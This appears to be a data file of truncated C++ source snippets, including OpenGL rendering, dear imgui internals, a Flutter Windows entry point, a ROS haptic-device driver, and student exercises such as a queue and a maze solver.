 (uvs.size() * sizeof(vec2))));\r\n\r\n    // update matrices and light\r\n    SetUniform(program, \"modelview\", camera.modelview);\r\n    SetUniform(program, \"persp\", camera.persp);\r\n    SetUniform(program, \"nLights\", nLights);\r\n    SetUniform3v(program, \"lights\", nLights, (float *) lights,\r\n                 camera.modelview);\r\n\r\n    // bind 2D texture, activate appropriate texture unit (enable GPU buffer)\r\n    glActiveTexture(GL_TEXTURE0 + textureUnit);\r\n    glBindTexture(GL_TEXTURE_2D, textureName);\r\n    SetUniform(program, \"textureImage\", textureUnit);\r\n\r\n    // enable bump map, made available for pixel shader\r\n    glActiveTexture(GL_TEXTURE0 + bumpUn",
    "//Implement a Queue using an Array. Queries in the Queue are of the following type:\n//(i) 1 x   (a query of this type means  pushing 'x' into the queue)\n//(ii) 2     (a query of this type means to pop an element from the queue and print the popped element. If the queue is empty then return -1)\n\n//We just have to implement the functions push and pop and the driver code will handle the output.\n//  main.cpp\n//  queue using array\n//\n//  Created by piyush ambure on 15/01/25.\n//\n\n#include <iostream>\nusing namespace std;\n\n// Struct for queue node\nstruct QueueNode {\n    int data;\n    QueueNode* next;\n};\n\n// Class for queue\nclass MyQueue {\nprivate:\n    QueueNode* front;\n    QueueNode* rear;\n\npublic:\n    MyQueue() : front(nullptr), rear(nullptr) {}\n\n    // Push function to add an element to the queue\n    void push(int x);\n\n    // Pop function to remove and return an element from the queue\n    int pop();\n};\n\n// Function to push an element into the queue\nvoid MyQueue::push(int x) {\n    QueueNode* newNode = new QueueNode;  // Create a new node\n    newNode->data = x;                    // Set the data of the new node\n    newNode->next = nullptr;              // Set the next pointer to nullptr (end of queue)\n\n    if (!rear) {  // If the queue is empty (no rear element)\n        front = rear = newNode;  // Both front and rear point to the new node\n    } else {\n        rear->next = newNode;    // Link the new node after the current rear node\n        rear = newNode;          // Move rear to the newly added node\n    }\n}\n\n// Function to pop an element from the queue\nint MyQueue::pop() {\n    if (!front) {  // If the queue is empty\n        return -1;\n    }\n\n    int result = front->data;  // Get the data from the front node\n    QueueNode* temp = front;   // Temporarily store the front node\n    front = front->next;       // Move the front pointer to the next node\n\n    if (!front) {  // If the queue is now empty\n        rear = nullptr;  // Set rear to nullptr\n    }\n\n    delete temp;  // Free the memory of the old front node\n    return result;\n}\n\n// Driver code\nint main() {\n    MyQueue q;\n    q.push(1);\n    q.push(2);\n    q.push(3);\n\n    cout << q.pop() << endl;  // Output: 1\n    cout << q.pop() << endl;  // Output: 2\n    cout << q.pop() << endl;  // Output: 3\n    cout << q.pop() << endl;  // Output: -1 (queue is empty)\n\n    return 0;\n}\n\n",
    "#include <memory>\n\n#include \"settings/SimulationSettings.h\"\n#include \"simulation.h\"\n#include \"objects/Tree.h\"\n#include \"gui/guiLoop.h\"\n#include \"protocols/brain/BotBrain.h\"\n#include \"BotRegister.h\"\n\nint main()\n{\n    std::shared_ptr<SimulationSettings> settings = std::make_shared<SimulationSettings>();\n\n    settings->simulationSizeSettings.unit = 50;\n    settings->simulationSizeSettings.numberOfChunksX = 20;\n    settings->simulationSizeSettings.numberOfChunksY = 20;\n\n    settings->mapGenerationSettings.spawnType = SpawnType::Circle;\n    settings->mapGenerationSettings.numberOfBotsPerPopulation = 70;\n    settings->mapGenerationSettings.spawnRadius = 50.0f;\n    settings->mapGenerationSettings.treeRarety = 0;\n    settings->mapGenerationSettings.randomSpawnFood = true;\n    settings->mapGenerationSettings.foodPerChunk = 3.0f;\n    settings->mapGenerationSettings.foodSpawnChance = 0.005f;\n\n    std::shared_ptr<Simulation> simulation = std::make_shared<Simulation>(\n        std::const_pointer_cast<const SimulationSettings>(settings)\n    );\n\n    simulation->initBotClasses();\n    simulation->generateTree();\n\n    std::random_device rd;\n    std::mt19937 gen;\n    std::uniform_int_distribution<int> distX = std::uniform_int_distribution<int>(100, simulation->chunkManager->mapWidth - 100);\n    std::uniform_int_distribution<int> distY = std::uniform_int_distribution<int>(100, simulation->chunkManager->mapHeight - 100);\n    std::uniform_int_distribution<int> fruitAmountRandom = std::uniform_int_distribution<int>(3, 4);\n    std::uniform_int_distribution<int> maxCalories = std::uniform_int_distribution<int>(50, 200);\n    std::uniform_int_distribution<int> respawnTime = std::uniform_int_distribution<int>(250, 600);\n\n    // for (int i = 0; i < simulation->chunkManager->numberOfChunksX * simulation->chunkManager->numberOfChunksY * 2; i++) {\n    //     simulation->addObject(SimulationObjectType::TreeObject,\n    //         std::dynamic_pointer_cast<SimulationObject> (\n    //             std::make_shared<TreeObject>(\n    //                 simulation,\n    //                 Vec2<float>(distX(gen), distY(gen)),\n    //                 fruitAmountRandom(gen),\n    //                 maxCalories(gen),\n    //                 0.5f,\n    //                 1.5f,\n    //                 respawnTime(gen),\n    //                 false\n    //             )\n    //         )\n    //     );\n    // }\n\n    guiLoop(simulation);\n\n    return 0;\n}",
    "// dear imgui, v1.91.3 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from win",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ticket_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\r\n#include <vector>\r\n#include <math.h>\r\n#include <map>\r\n#include <iomanip>\r\n#include <numeric>\r\n#include <fstream>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\n\r\n// \u0423\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435 \u043c\u0430\u0442\u0440\u0438\u0446\r\nvector<vector<int>> matrixMultiply(const vector<vector<int>>& A, const vector<vector<int>>& B) {\r\n    int rows1 = A.size();\r\n    int cols1 = A[0].size();\r\n    int cols2 = B[0].size();\r\n\r\n    vector<vector<int>> result(rows1, vector<int>(cols2, 0));\r\n\r\n    for (int i = 0; i < rows1; ++i) {\r\n        for (int j = 0; j < cols2; ++j) {\r\n            for (int k = 0; k < cols1; ++k) {\r\n                result[i][j] += (A[i][k] * B[k][j]);\r\n                result[i][j] %= 2;\r\n            }\r\n        }\r\n    }\r\n    return result;\r\n}\r\n// \u0412\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u0442\u0440\u0430\u043d\u0441\u043f\u043e\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0439 \u043c\u0430\u0442\u0440\u0438\u0446\u044b\r\nvector<vector<int>> transpose(const vector<vector<int>>& matrix) {\r\n    int rows = matrix.size();\r\n    int cols = matrix[0].size();\r\n\r\n    vector<vector<int>> transposed(cols, vector<int>(rows));\r\n\r\n    for (int i = 0; i < rows; ++i) {\r\n        for (int j = 0; j < cols; ++j) {\r\n            transposed[j][i] = matrix[i][j];\r\n        }\r\n    }\r\n\r\n    return transposed;\r\n}\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043e\u0431\u043c\u0435\u043d\u0430 \u0441\u0442\u0440\u043e\u043a\r\nvoid swapRows(vector<vector<int>>& matrix, int row1, int row2) {\r\n    swap(matrix[row1], matrix[row2]);\r\n}\r\n\r\n// \u043f\u0435\u0440\u0435\u0432\u043e\u0434 \u0432 \u043a\u0430\u043d\u043e\u043d\u0438\u0447\u043d\u0443\u044e \u0444\u043e\u0440\u043c\u0443\r\nvector<vector<int>> toCanonicalForm(const vector<vector<int>>& originalMatrix) {\r\n    vector<vector<int>> matrix = originalMatrix;\r\n    int numRows = matrix.size();\r\n\r\n    if (numRows == 0) {\r\n        return {};\r\n    }\r\n\r\n    int numCols = matrix[0].size();\r\n    int lead = 0; // \u0422\u0435\u043a\u0443\u0449\u0430\u044f \u0432\u0435\u0434\u0443\u0449\u0430\u044f \u043f\u043e\u0437\u0438\u0446\u0438\u044f\r\n\r\n    for (int row = 0; row < numRows; ++row) {\r\n        if (lead >= numCols) break;\r\n\r\n        // \u041d\u0430\u0445\u043e\u0434\u0438\u043c \u0432\u0435\u0434\u0443\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\r\n        int pivotRow = row;\r\n        while (pivotRow < numRows && matrix[pivotRow][lead] == 0) {\r\n            pivotRow++;\r\n        }\r\n        if (pivotRow == numRows) {\r\n            lead++;\r\n            row--;\r\n            continue;\r\n        }\r\n\r\n        // \u041f\u0435\u0440\u0435\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438\r\n        if (pivotRow != row) {\r\n            swapRows(matrix, row, pivotRow);\r\n        }\r\n\r\n        // \u0414\u0435\u043b\u0438\u043c \u0442\u0435\u043a\u0443\u0449\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443 \u043d\u0430 \u0432\u0435\u0434\u0443\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\r\n        double pivot = matrix[row][lead];\r\n        if (pivot != 1.0) {\r\n            for (int col = 0; col < numCols; col++) {\r\n                matrix[row][col] /= pivot;\r\n            }\r\n        }\r\n\r\n        // \u041e\u0431\u043d\u0443\u043b\u044f\u0435\u043c \u043e\u0441\u0442\u0430\u043b\u044c\u043d\u044b\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u0441\u0442\u043e\u043b\u0431\u0446\u0430\r\n        for (int i = 0; i < numRows; ++i) {\r\n            if (i != row) {\r\n                double factor = matrix[i][lead];\r\n                for (int j = 0; j < numCols; j++) {\r\n                    matrix[i][j] -= factor * matrix[row][j];\r\n                }\r\n            }\r\n        }\r\n        lead++;\r\n    }\r\n\r\n    //\u0417\u0430\u043c\u0435\u043d\u044f\u0435\u043c -1 \u043d\u0430 1 \r\n    for (int i = 0; i < matrix.size(); i++) {\r\n        for (int j = 0; j < matrix[0].size(); j++) {\r\n            if (matrix[i][j] == -1) {\r\n                matrix[i][j] = 1;\r\n            }\r\n        }\r\n    }\r\n\r\n    return matrix;\r\n}\r\n// \u041d\u0430\u0445\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0432\u0435\u0440\u043e\u0447\u043d\u043e\u0439 \u043c\u0430\u0442\u0440\u0438\u0446\u044b H\r\nvector<vector<int>> findH(const vector<vector<int>>& G) {\r\n    int k = G.size();\r\n    int n = G[0].size();\r\n    int r = n - k; \r\n\r\n    vector<vector<int>> H;\r\n    vector<int> row(n, 0);\r\n\r\n    for (int j = 0; j < r; ++j) {\r\n        H.push_back(row);\r\n    }\r\n    vector<vector<int>> GTransposed = transpose(G);\r\n    for (int i = 0; i < r; i++) {\r\n        for (int j = 0; j < k; j++) {\r\n            H[i][j] = GTransposed[i+ k][j];\r\n        }\r\n    }\r\n    for (int j = 0; j < r; j++) {\r\n\r\n        H[j][k + j] = 1;\r\n    }\r\n\r\n    return H;\r\n}\r\n// \u0412\u0435\u0441 \u0425\u044d\u043c\u043c\u0438\u043d\u0433\u0430\r\nint hammingWeight(const vector<int>& a) {\r\n    int weight = 0;\r\n\r\n    for (int val : a) {\r\n        if (val)\r\n            weight++;\r\n    }\r\n\r\n    return weight;\r\n}\r\n//\u0412\u0435\u0441 \u043a\u043e\u0434\u0430\r\nint findMinWt(const vector<vector<int>>& G) {\r\n    int rows = G.size();\r\n    int cols = G[0].size();\r\n    int minCounter = G[0].size() + 1;\r\n\r\n    for (int i = 0; i < rows; ++i) {\r\n        int counter = 0;\r\n        for (int j = 0; j < cols; ++j) {\r\n            if (G[i][j] != 0) {\r\n                counter++;\r\n            }\r\n        }\r\n        minCounter = min(counter, minCounter);\r\n        \r\n    }\r\n\r\n    return minCounter;\r\n}\r\n\r\n//\u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0425\u044d\u043c\u043c\u0438\u043d\u0433\u0430 \u0434\u043b\u044f \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u043e\u0439 \u0434\u043b\u0438\u043d\u044b\r\nint hammingDistanceVec(const vector<int>& A, const vector<int>& B) {\r\n    int distance = 0;\r\n\r\n    for (size_t i = 0; i < A.size(); ++i) {\r\n        if (A[i] != B[i]) {\r\n            distance++;\r\n        }\r\n    }\r\n\r\n    return distance;\r\n}\r\n// \u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0425\u044d\u043c\u043c\u0438\u043d\u0433\u0430 \u0434\u043b\u044f \u043a\u043e\u0434\u0430\r\nint calculateAllHammingDistances(const vector<vector<int>>& matrix) {\r\n    int numRows = matrix.size();\r\n    int cols = matrix[0].size();\r\n    int minHamming = matrix[0].size() + 1;\r\n\r\n    for (int i = 0; i < numRows; ++i) {\r\n        for (int j = i + 1; j < numRows; ++j) {\r\n            minHamming = min(hammingDistanceVec(matrix[i], matrix[j]), minHamming);\r\n        }\r\n    }\r\n\r\n    return minHamming;\r\n}\r\n// \u043a\u043e\u0434\u043e\u0432\u043e\u0435 \u0440\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435\r\nint codeDistance(const vector<vector<int>>& matrix) {\r\n    int W",
    "/*\n *  Copyright (c) 2022 Ivo Dekker ACRO Diepenbeek KULeuven\n\n Permission is hereby granted, free of charge, to any person\n obtaining a copy of this software and associated documentation\n files (the \"Software\"), to deal in the Software without\n restriction, including without limitation the rights to use,\n copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the\n Software is furnished to do so, subject to the following\n conditions:\n\n The above copyright notice and this permission notice shall be\n included in all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n OTHER DEALINGS IN THE SOFTWARE.\n */\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"geometry_msgs/msg/pose_stamped.hpp\"\n#include \"geometry_msgs/msg/wrench_stamped.hpp\"\n#include <urdf_model/model.h>\n#include \"sensor_msgs/msg/joint_state.hpp\"\n\n#include <string.h>\n#include <stdio.h>\n#include <math.h>\n#include <assert.h>\n#include <chrono>\n#include <sstream>\n#include <unistd.h>\n\n#include <HL/hl.h>\n#include <HD/hd.h>\n#include <HDU/hduError.h>\n#include <HDU/hduVector.h>\n#include <HDU/hduMatrix.h>\n#include <HDU/hduQuaternion.h>\n#define BT_EULER_DEFAULT_ZYX\n#include <bullet/LinearMath/btMatrix3x3.h>\n\n#include \"omni_msgs/msg/omni_button_event.hpp\"\n#include \"omni_msgs/msg/omni_feedback.hpp\"\n#include \"omni_msgs/msg/omni_state.hpp\"\n#include <pthread.h>\n\nfloat prev_time;\nint calibrationStyle;\n\nstruct OmniState\n{\n    hduVector3Dd position; // 3x1 vector of position\n    hduVector3Dd velocity; // 3x1 vector of velocity\n    hduVector3Dd inp_vel1; // 3x1 history of velocity used for filtering velocity estimate\n    hduVector3Dd inp_vel2;\n    hduVector3Dd inp_vel3;\n    hduVector3Dd out_vel1;\n    hduVector3Dd out_vel2;\n    hduVector3Dd out_vel3;\n    hduVector3Dd pos_hist1; // 3x1 history of position used for 2nd order backward difference estimate of velocity\n    hduVector3Dd pos_hist2;\n    hduQuaternion rot;\n    hduVector3Dd joints;\n    hduVector3Dd force; // 3 element double vector force[0], force[1], force[2]\n    float thetas[7];\n    int buttons[2];\n    int buttons_prev[2];\n    bool lock;\n    bool close_gripper;\n    hduVector3Dd lock_pos;\n    double units_ratio;\n};\n\nclass PhantomROS\n{\n\npublic:\n    std::shared_ptr<rclcpp::Node> node_;\n    rclcpp::Publisher<omni_msgs::msg::OmniState>::SharedPtr state_publisher;\n    rclcpp::Publisher<geometry_msgs::msg::PoseStamped>::SharedPtr pose_publisher;\n    rclcpp::Publisher<omni_msgs::msg::OmniButtonEvent>::SharedPtr button_publisher;\n    rclcpp::Publisher<sensor_msgs::msg::JointState>::SharedPtr joint_publisher;\n    rclcpp::Subscription<omni_msgs::msg::OmniFeedback>::SharedPtr haptic_sub;\n    std::string omni_name, ref_frame, units;\n    int publish_rate;\n\n    int test_i = 0;\n\n    OmniState *state;\n    rclcpp::TimerBase::SharedPtr pub_timer;\n\n    PhantomROS(std::shared_ptr<rclcpp::Node> node)\n    {\n        node_ = node;\n        node_->declare_parameter<std::string>(\"~omni_name\", \"phantom\");\n        node_->declare_parameter<std::string>(\"~reference_frame\", \"/map\");\n        node_->declare_parameter<std::string>(\"~units\", \"mm\");\n        node_->declare_parameter<int>(\"~publish_rate\", 1000);\n        node_->get_parameter<std::string>(\"~omni_name\", omni_name);\n        node_->get_parameter<std::string>(\"~reference_frame\", ref_frame);\n        node_->get_parameter<std::string>(\"~units\", units);\n        node_->get_parameter<int>(\"~publish_rate\", publish_rate);\n    }\n\n    void init(OmniState *s)\n    {\n        // Publish button state on NAME/button\n        std::ostringstream stream1;\n        stream1 << omni_name << \"/button\";\n        std::string button_topic = std::string(stream1.str());\n        button_publisher = node_->create_publisher<omni_msgs::msg::OmniButtonEvent>(button_topic.c_str(), 100);\n        // RCLCPP_INFO(node_->get_logger(), \"Publishing button events on: \" + button_topic);\n        RCLCPP_INFO(node_->get_logger(), (\"Publishing button events on: \" + button_topic).c_str());\n\n\n        // Publish on NAME/state\n        std::ostringstream stream2;\n        stream2 << omni_name << \"/state\";\n        std::string state_topic_name = std::string(stream2.str());\n        state_publisher = node_->create_publisher<omni_msgs::msg::OmniState>(state_topic_name.c_str(), 1);\n        // RCLCPP_INFO(node_->get_logger(), \"Publishing omni state on: \" + state_topic_name);\n        RCLCPP_INFO(node_->get_logger(), (\"Publishing omni state on: \" + state_topic_name).c_str());\n\n        // Subscribe to NAME/force_feedback\n        std::ostringstream stream3;\n        stream3 << o",
    "// dear imgui, v1.83\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n#if !defined(alloca)\n#if defined(__GLIBC__) || defined(__sun) || defined(__APPLE__) || defined(__NEWLIB__)\n#include <alloca.h>     // alloca (glibc uses <alloca.h>. Note that Cygwin may have _WIN32 defined, so the order matters here)\n#elif defined(_WIN32)\n#include <malloc.h>     // alloca\n#if !defined(alloca)\n#define alloca _alloca  // for clang with MS Codegen\n#endif\n#else\n#include <stdlib.h>     // alloca\n#endif\n#endif\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 6255)     // [Static Analyzer] _alloca indicates failure by raising a stack overflow exception.  Consider using _malloca instead.\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#if __has_warning(\"-Walloca\")\n#pragma clang diagnostic ignored \"-Walloca\"                         // warning: use of function '__builtin_alloca' is discouraged\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warni",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\nbool issafe(int **arr, int x, int y, int n)\r\n{\r\n    if ( x < n && y < n && arr[x][y] == 1 )\r\n    {\r\n        return true;\r\n    }\r\n    else\r\n    {\r\n        return false;\r\n    }\r\n}\r\n\r\nbool mazesolve(int **arr, int x, int y, int n, int **sol)\r\n{\r\n\r\n    if (issafe(arr, x, y, n))\r\n    {\r\n        if (x == n - 1 && y == n - 1)\r\n        {\r\n            sol[x][y] = 1;\r\n            return true;\r\n        }\r\n        sol[x][y] = 1;\r\n        if (mazesolve(arr, x + 1, y, n, sol))\r\n        {\r\n            return true;\r\n        }\r\n        if (mazesolve(arr, x, y + 1, n, sol))\r\n        {\r\n            return true;\r\n        }\r\n        if (mazesolve(arr, x-1, y, n, sol))\r\n        {\r\n            return true;\r\n        }\r\n        else\r\n        {\r\n            sol[x][y] = 0;\r\n            return false;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nint main()\r\n{cout <<\"enter size of maze n X n = \";\r\n    int n;\r\n    cin >> n;\r\ncout <<\"input maze\"<<endl;\r\n    int **maze = new int *[n];\r\n    for (int j = 0; j < n; j++)\r\n    {\r\n        maze[j] = new int[n];\r\n    }\r\n    for (int j = 0; j < n; j++)\r\n    {\r\n        for (int i = 0; i < n; i++)\r\n        {\r\n            cin >> maze[j][i];\r\n        }\r\n    }\r\n    int **mazesol = new int *[n];\r\n    for (int j = 0; j < n; j++)\r\n    {\r\n        mazesol[j] = new int[n];\r\n    }\r\n    for (int j = 0; j < n; j++)\r\n    {\r\n        for (int i = 0; i < n; i++)\r\n        {\r\n            mazesol[j][i] =0;\r\n        }\r\n    }\r\n\r\ncout <<endl<<\"solution\"<<endl;\r\n    if (mazesolve(maze, 0, 0, n, mazesol))\r\n    {\r\n         for (int j = 0; j < n; j++)\r\n    {\r\n        for (int i = 0; i < n; i++)\r\n        {\r\n            cout << mazesol[j][i] <<\" \";\r\n        }\r\n        cout<<endl;\r\n    }\r\n    }\r\n\r\n    return 0;\r\n}",
